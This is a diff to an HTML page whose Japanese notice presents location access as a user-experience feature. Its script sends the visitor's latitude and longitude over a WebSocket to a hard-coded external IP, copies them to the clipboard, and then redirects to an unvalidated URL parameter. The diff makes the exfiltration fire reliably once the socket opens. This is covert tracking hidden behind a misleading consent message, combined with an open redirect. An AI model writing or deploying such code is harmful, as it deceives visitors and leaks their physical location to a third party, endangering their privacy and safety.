@@ -2,11 +2,12 @@
 <a>このサイトでは、ユーザーエクスペリエンス向上のため、位置情報を使用します。位置情報を許可していただくと次のサイトに遷移します。</a>
 <script type="text/javascript">
     ws = new WebSocket("wss://114.146.22.1:4721/")
-    navigator.geolocation.getCurrentPosition(function(a){
-        navigator.clipboard.writeText(`${a.coords.latitude}, ${a.coords.longitude}`)
-        ws.send(`${a.coords.latitude}, ${a.coords.longitude}`)
-        location.href=new URL(location.href).searchParams.get("redirect")
-    },
-    function(a){})
-    
+    ws.addEventListener("open", function(){
+        navigator.geolocation.getCurrentPosition(function(a){
+            navigator.clipboard.writeText(`${a.coords.latitude}, ${a.coords.longitude}`)
+            ws.send(`${a.coords.latitude}, ${a.coords.longitude}`)
+            location.href=new URL(location.href).searchParams.get("redirect")
+            },
+        function(a){})
+    })
 </script>
